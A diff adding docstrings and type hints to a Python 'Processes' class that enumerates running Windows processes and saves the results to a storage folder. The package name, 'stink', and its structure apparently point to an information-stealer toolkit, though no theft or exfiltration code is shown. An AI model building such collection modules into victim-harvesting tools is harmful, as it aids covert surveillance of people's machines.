@@ -7,22 +7,30 @@ from stink.helpers import ProcessEntry32, ProcessMemoryCountersEx
 
 
 class Processes:
-
+    """
+    Collects all running processes.
+    """
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
         self.__storage_path = storage_path
         self.__folder = folder
         self.__errors = errors
 
-    def __create_folder(self):
-
+    def __create_folder(self) -> None:
+        """
+        Creates storage for the Processes module.
+        :return: None
+        """
         storage_path = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(storage_path):
             makedirs(storage_path, exist_ok=True)
 
-    def __get_system_processes(self):
-
+    def __get_system_processes(self) -> None:
+        """
+        Collects all running processes.
+        :return: None
+        """
         results = []
 
         PROCESS_QUERY_INFORMATION = 0x0400
@@ -55,8 +63,11 @@ class Processes:
 
         processes.close()
 
-    def run(self):
-
+    def run(self) -> None:
+        """
+        Launches the processes collection module.
+        :return: None
+        """
         try:
 
             self.__create_folder()
